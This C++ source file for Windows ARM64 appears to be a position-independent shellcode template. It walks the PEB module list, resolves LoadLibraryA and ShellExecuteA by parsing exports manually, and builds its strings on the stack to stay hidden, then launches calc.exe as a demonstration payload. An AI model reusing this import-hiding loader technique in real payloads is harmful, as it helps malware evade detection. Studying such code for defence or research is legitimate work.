#include <Windows.h>

//0x18 bytes (sizeof)
struct _RTL_BALANCED_NODE
{
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];                             //0x0
        struct
        {
            struct _RTL_BALANCED_NODE* Left;                                //0x0
            struct _RTL_BALANCED_NODE* Right;                               //0x8
        };
    };
    union
    {
        struct
        {
            UCHAR Red : 1;                                                    //0x10
            UCHAR Balance : 2;                                                //0x10
        };
        ULONGLONG ParentValue;                                              //0x10
    };
};

//0x10 bytes (sizeof)
struct _UNICODE_STRING
{
    USHORT Length;                                                          //0x0
    USHORT MaximumLength;                                                   //0x2
    WCHAR* Buffer;                                                          //0x8
};

//0x138 bytes (sizeof)
struct _LDR_DATA_TABLE_ENTRY
{
    struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
    struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
    struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
    VOID* DllBase;                                                          //0x30
    VOID* EntryPoint;                                                       //0x38
    ULONG SizeOfImage;                                                      //0x40
    struct _UNICODE_STRING FullDllName;                                     //0x48
    struct _UNICODE_STRING BaseDllName;                                     //0x58
    union
    {
        UCHAR FlagGroup[4];                                                 //0x68
        ULONG Flags;                                                        //0x68
        struct
        {
            ULONG PackagedBinary : 1;                                         //0x68
            ULONG MarkedForRemoval : 1;                                       //0x68
            ULONG ImageDll : 1;                                               //0x68
            ULONG LoadNotificationsSent : 1;                                  //0x68
            ULONG TelemetryEntryProcessed : 1;                                //0x68
            ULONG ProcessStaticImport : 1;                                    //0x68
            ULONG InLegacyLists : 1;                                          //0x68
            ULONG InIndexes : 1;                                              //0x68
            ULONG ShimDll : 1;                                                //0x68
            ULONG InExceptionTable : 1;                                       //0x68
            ULONG ReservedFlags1 : 2;                                         //0x68
            ULONG LoadInProgress : 1;                                         //0x68
            ULONG LoadConfigProcessed : 1;                                    //0x68
            ULONG EntryProcessed : 1;                                         //0x68
            ULONG ProtectDelayLoad : 1;                                       //0x68
            ULONG ReservedFlags3 : 2;                                         //0x68
            ULONG DontCallForThreads : 1;                                     //0x68
            ULONG ProcessAttachCalled : 1;                                    //0x68
            ULONG ProcessAttachFailed : 1;                                    //0x68
            ULONG CorDeferredValidate : 1;                                    //0x68
            ULONG CorImage : 1;                                               //0x68
            ULONG DontRelocate : 1;                                           //0x68
            ULONG CorILOnly : 1;                                              //0x68
            ULONG ChpeImage : 1;                                              //0x68
            ULONG ChpeEmulatorImage : 1;                                      //0x68
            ULONG ReservedFlags5 : 1;                                         //0x68
            ULONG Redirected : 1;                                             //0x68
            ULONG ReservedFlags6 : 2;                                         //0x68
            ULONG CompatDatabaseProcessed : 1;                                //0x68
        };
    };
    USHORT ObsoleteLoadCount;                                               //0x6c
    USHORT TlsIndex;                                                        //0x6e
    struct _LIST_ENTRY HashLinks;                                           //0x70
    ULONG TimeDateStamp;                                                    //0x80
    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                //0x88
    VOID* Lock;                                                             //0x90
    struct _LDR_DDAG_NODE* DdagNode;                                        //0x98
    struct _LIST_ENTRY NodeModuleLink;                                      //0xa0
    struct _LDRP_LOAD_CONTEXT* LoadContext;                                 //0xb0
    VOID* ParentDllBase;                                                    //0xb8
    VOID* SwitchBackContext;                                                //0xc0
    struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         //0xc8
    struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         //0xe0
    ULONGLONG OriginalBase;                                                 //0xf8
    union _LARGE_INTEGER LoadTime;                                          //0x100
    ULONG BaseNameHashValue;                                                //0x108
    enum _LDR_DLL_LOAD_REASON LoadReason;                                   //0x10c
    ULONG ImplicitPathOptions;                                              //0x110
    ULONG ReferenceCount;                                                   //0x114
    ULONG DependentLoadFlags;                                               //0x118
    UCHAR SigningLevel;                                                     //0x11c
    ULONG CheckSum;                                                         //0x120
    VOID* ActivePatchImageBase;                                             //0x128
    enum _LDR_HOT_PATCH_STATE HotPatchState;                                //0x130
};

//0x58 bytes (sizeof)
struct _PEB_LDR_DATA
{
    ULONG Length;                                                           //0x0
    UCHAR Initialized;                                                      //0x4
    VOID* SsHandle;                                                         //0x8
    struct _LIST_ENTRY InLoadOrderModuleList;                               //0x10
    struct _LIST_ENTRY InMemoryOrderModuleList;                             //0x20
    struct _LIST_ENTRY InInitializationOrderModuleList;                     //0x30
    VOID* EntryInProgress;                                                  //0x40
    UCHAR ShutdownInProgress;                                               //0x48
    VOID* ShutdownThreadId;                                                 //0x50
};

struct _PEBARM64
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages : 1;                                    //0x3
            UCHAR IsProtectedProcess : 1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated : 1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders : 1;                           //0x3
            UCHAR IsPackagedProcess : 1;                                      //0x3
            UCHAR IsAppContainer : 1;                                         //0x3
            UCHAR IsProtectedProcessLight : 1;                                //0x3
            UCHAR IsLongPathAwareProcess : 1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    VOID* Mutant;                                                           //0x8
    VOID* ImageBaseAddress;                                                 //0x10
    struct _PEB_LDR_DATA* Ldr;                                              //0x18

};

static inline wchar_t manual_towlower(wchar_t c) {

    if (c >= L'A' && c <= L'Z') return c + (L'a' - L'A');

    if (c >= 0x00C0 && c <= 0x00D6) return c + (0x00E0 - 0x00C0);

    if (c >= 0x00D8 && c <= 0x00DE) return c + (0x00F8 - 0x00D8);

    return c;
}

int wcsicmp_manual(const wchar_t* s1, const wchar_t* s2) {

    wchar_t c1, c2;
    while (*s1 != L'\0' && *s2 != L'\0') {

        c1 = manual_towlower(*s1++);
        c2 = manual_towlower(*s2++);
        if (c1 != c2) return (c1 < c2) ? -1 : 1;

    }

    c1 = manual_towlower(*s1);
    c2 = manual_towlower(*s2);

    if (c1 == c2) return 0;

    return (c1 < c2) ? -1 : 1;
}

int strcmp_manual(const char* s1, const char* s2) {

    unsigned char c1, c2;

    while (1) {

        c1 = (unsigned char)*s1++;
        c2 = (unsigned char)*s2++;

        if (c1 != c2) return (c1 < c2) ? -1 : 1;

        if (c1 == '\0') return 0;

    }
}

#pragma intrinsic(__getReg)

uintptr_t module_from_peb(WCHAR* module_name) {

    // Get PEB from TEB (x18 on ARM64) + 0x60
    auto peb = *reinterpret_cast<_PEBARM64**>(__getReg(18) + 0x60);

    auto flinkx = *reinterpret_cast<_LDR_DATA_TABLE_ENTRY**>(&peb->Ldr->InLoadOrderModuleList);

    do {

        if (wcsicmp_manual(flinkx->BaseDllName.Buffer, module_name) == 0) return reinterpret_cast<uintptr_t>(flinkx->DllBase);

        flinkx = reinterpret_cast<_LDR_DATA_TABLE_ENTRY*>(flinkx->InLoadOrderLinks.Flink);

    } while (flinkx && flinkx->BaseDllName.Buffer != nullptr);

    return 0;
}

uintptr_t GetFunctionAddressByName(uintptr_t moduleBase, char* functionName) {

    if (!moduleBase || !functionName) return 0;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) return 0;

    auto exportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<unsigned char*>(moduleBase) + exportDataDir.VirtualAddress);
    auto namesRVA = reinterpret_cast<DWORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfNames);
    auto ordinalsRVA = reinterpret_cast<WORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfNameOrdinals);
    auto functionsRVA = reinterpret_cast<DWORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfFunctions);

    for (auto i = 0; i < exportDir->NumberOfNames; ++i) {

        auto name = reinterpret_cast<const char*>(reinterpret_cast<unsigned char*>(moduleBase) + namesRVA[i]);

        if (strcmp_manual(name, functionName) == 0) {

            auto ordinal = ordinalsRVA[i];
            auto funcRVA = functionsRVA[ordinal];

            return reinterpret_cast<uintptr_t>(reinterpret_cast<unsigned char*>(moduleBase) + funcRVA);
        }
    }

    return 0;
}

using tpdCreateProcessA = BOOL ( WINAPI* ) ( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );
using tpdLoadLibraryA = HMODULE ( WINAPI* ) ( LPCSTR );
using tpdShellExecuteA = HINSTANCE ( WINAPI* )( HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT );

extern "C" int _KeowuMain(void) {
 
    wchar_t wchKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    char chLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    char chShell32[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
    char chShellExecuteA[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','A',0 };
    char chCmd[] = { 'c','a','l','c','.','e','x','e',0 };
    char chOpen[] = { 'o', 'p', 'e', 'n', 0 };

    auto kernel32Base = module_from_peb(wchKernel32);

    auto pLoadLibraryA = reinterpret_cast<tpdLoadLibraryA>(GetFunctionAddressByName(kernel32Base, chLoadLibraryA));

    auto shell32Base = pLoadLibraryA(chShell32);
    if (!shell32Base) return -1;

    auto pShellExecuteA = reinterpret_cast<tpdShellExecuteA>(GetFunctionAddressByName(reinterpret_cast<uintptr_t>(shell32Base), chShellExecuteA));

    pShellExecuteA(NULL, chOpen, chCmd, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}